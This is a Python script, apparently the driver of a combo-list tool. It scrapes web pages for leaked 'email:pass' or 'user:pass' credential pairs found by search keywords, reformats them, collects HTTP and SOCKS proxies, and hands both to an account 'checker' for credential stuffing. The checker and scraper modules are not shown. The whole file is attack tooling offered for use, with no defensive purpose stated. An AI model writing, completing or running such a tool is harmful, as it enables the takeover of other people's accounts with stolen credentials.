from modules.Scrapper import *
from modules.format import *
from modules.ProxyScraper import *
from modules.checker import *
import sys, os

def get_proxys(type, timeout):
    if type == "1":
        p = scrape.http(str(timeout))
    elif type == "2":
        p = scrape.socks4(str(timeout))
    elif type == "3":
        p = scrape.socks5(str(timeout))
    else:
        print("something went wrong :o")
        sys.exit()
    
    return p

def get_mode(input):

    switcher = {
        "1":0,
        "2":1
        }

    s = switcher.get(m, None)
    return s


print("""\
Lets config ur session :)

what do u want to scrape?

[1] all (only good if u want user:pass)
[2] only email:pass

""")
m = str(input())
print("""\

What kind of Proxys do want for checking?

[1] http
[2] socks4
[3] socks5

""")
p_type = input()

print("""\

Now tell me the highest Proxy timeout u want^^ (min 50 | max 5000)

""")
timeout = input("Timeout: ")

m = get_mode(m)
if m == None:
    m = 0
print("Now its scraping time :D\n")
k = input("\nEnter Keywords: ")

p = Scrapper.Scraping(k)

list = []

for url in p:
    u = Scrapper.TextScrape(url, m)
    if u is not None:
        list.extend(u)
    else:
        print("No combos found here :c")

combo_list = []
for c in list:
    c = c.replace(";", ":")
    c = format.combo(c)
    combo_list.append(c)

proxy_list = get_proxys(p_type, timeout)
print("Finshed Proxy checking!\nNow its Account checking Time :D\n")

checker(combo_list, proxy_list)

sys.exit()
